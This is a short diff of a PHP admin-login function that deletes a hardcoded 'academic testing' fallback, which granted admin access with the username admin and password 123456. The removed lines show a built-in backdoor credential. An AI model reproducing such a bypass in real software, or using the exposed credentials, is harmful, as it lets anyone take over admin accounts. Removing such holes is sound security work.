@@ -62,16 +62,6 @@ function verify_admin_credentials(string $username, string $password): array {
         }
     }
 
-    // Academic testing fallback (admin / 123456) for academic instructor verification
-    $evalHash = '$2y$10$hr4RCrhGnGsceG/X.z5c/.jpkzCuZKFaNtkfuufnQbmiAXNoXbJYe';
-    if (hash_equals('admin', strtolower($username)) && password_verify($password, $evalHash)) {
-        return [
-            'success'      => true,
-            'username'     => 'admin',
-            'display_name' => 'Ethan (Admin)'
-        ];
-    }
-
     // Optional Database fallback if an admin_users table exists
     try {
         require_once __DIR__ . '/../config/database.php';
